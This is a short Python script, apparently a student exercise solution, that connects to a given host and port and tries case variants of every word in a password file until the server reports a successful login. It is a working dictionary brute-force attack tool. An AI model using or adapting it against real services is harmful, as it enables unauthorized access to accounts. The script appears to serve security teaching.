# write your code here

import socket
import itertools
import argparse


class SocketClient:
    RECV_NUM = 1024

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None

    def connect(self):
        if self.socket is None:
            self.socket = socket.socket()
        self.socket.connect((self.host, self.port))

    def disconnect(self):
        self.socket.close()
        self.socket = None

    def send_data(self, data):
        if self.socket is None:
            self.connect()
        self.socket.send(data.encode())

    def recv_data(self):
        if self.socket is None:
            self.connect()
        return self.socket.recv(SocketClient.RECV_NUM).decode()


class PasswordHacker:
    def __init__(self, conn):
        self.conn = conn
        self.char_num = []
        self.data = []

    @staticmethod
    def mutate_word(data):
        lower_w = data.lower()
        upper_w = data.upper()
        return [''.join(i) for i in itertools.product(*zip(lower_w,  upper_w))]

    def save_data(self):
        with open('passwords.txt', 'r') as word_password:
            self.data = [line.rstrip('\n') for line in word_password]

    def based_password(self):
        self.save_data()

        for pwd in self.data:
            for wrd in self.mutate_word(pwd):
                self.conn.send_data(wrd)
                resp = self.conn.recv_data()

                if 'Wrong password!' in resp:
                    continue
                if 'Connection success!' in resp:
                    print(wrd)
                    exit()
                elif 'Too many attempts' in resp:
                    print('Too many attempts')
                    exit()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('hostname', default='127.0.0.1', help='host name or IP address')
    parser.add_argument('port', type=int)
    args_name = parser.parse_args()

    conn = SocketClient(host=args_name.hostname, port=args_name.port)

    try:
        conn.connect()
        PasswordHacker(conn).based_password()
        conn.disconnect()
    except ConnectionRefusedError:
        print('No connect!')


if __name__ == '__main__':
    main()
